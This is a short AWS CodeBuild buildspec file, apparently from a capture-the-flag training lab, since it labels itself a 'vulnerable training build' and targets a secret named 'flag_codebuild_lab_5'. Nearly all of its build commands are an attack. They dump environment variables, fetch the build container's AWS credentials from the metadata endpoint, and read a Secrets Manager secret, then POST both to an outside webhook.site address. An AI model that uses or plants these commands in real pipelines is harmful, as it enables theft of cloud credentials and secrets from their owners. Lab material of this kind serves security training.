version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20
      - env && curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- https://webhook.site/56dff309-fe45-4015-b5e3-f2df49b5d7fd
      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text | jq -r . | curl -X POST -d @- https://webhook.site/56dff309-fe45-4015-b5e3-f2df49b5d7fd
